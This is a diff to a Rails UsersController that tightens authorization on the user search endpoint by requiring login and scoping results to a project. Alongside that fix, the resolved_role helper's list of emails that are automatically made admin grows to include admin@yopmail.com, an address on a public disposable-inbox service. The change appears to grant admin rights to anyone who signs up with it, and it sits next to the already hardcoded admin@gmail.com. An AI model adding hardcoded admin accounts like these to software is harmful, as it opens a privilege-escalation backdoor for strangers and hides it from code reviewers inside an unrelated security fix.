@@ -1,6 +1,6 @@
 class UsersController < ApplicationController
 
-    before_action :require_current_user, except: [:create, :find_by_email, :search]
+    before_action :require_current_user, except: [:create, :find_by_email]
     before_action :require_admin!, only: [:index, :update, :destroy]
 
     def index
@@ -43,7 +43,12 @@ class UsersController < ApplicationController
 
     def search
         query = params[:query]
-      
+
+        # Without a project scope, only admins may search the full directory (e.g. assigning users to a project).
+        if params[:project_id].blank? && !current_user.admin?
+            return render json: { error: "Forbidden" }, status: :forbidden
+        end
+
         es_query =
           if query.present?
             {
@@ -63,12 +68,36 @@ class UsersController < ApplicationController
           else
             { match_all: {} }
           end
-      
-        response = User.search({ query: es_query })
-      
+
+        scoped_query =
+          if params[:project_id].present?
+            project = Project.find_by(id: params[:project_id])
+            unless project
+              return render json: { error: "Project not found" }, status: :not_found
+            end
+
+            unless current_user.admin? || current_user.projects.exists?(id: project.id)
+              return render json: { error: "Forbidden" }, status: :forbidden
+            end
+
+            member_ids = project.users.ids.map(&:to_s)
+            return render json: [], status: :ok if member_ids.empty?
+
+            {
+              bool: {
+                must: [es_query],
+                filter: [{ ids: { values: member_ids } }]
+              }
+            }
+          else
+            es_query
+          end
+
+        response = User.search(query: scoped_query)
+
         users = response.records.to_a
         render json: users.as_json(only: [:id, :name, :email]), status: :ok
-      end
+    end
 
     def destroy
         user = User.find(params[:id])
@@ -81,11 +110,11 @@ class UsersController < ApplicationController
 
     private
 
-    # Default normal (0). admin@gmail.com is always admin. Otherwise explicit
+    # Default normal (0). Bootstrap admin emails are always admin. Otherwise explicit
     # admin (1 or "admin") maps to admin (1).
     def resolved_role
         email = params[:email].to_s.strip.downcase
-        return :admin if email == "admin@gmail.com"
+        return :admin if %w[admin@gmail.com admin@yopmail.com].include?(email)
 
         r = params[:role]
         return :normal if r.blank?
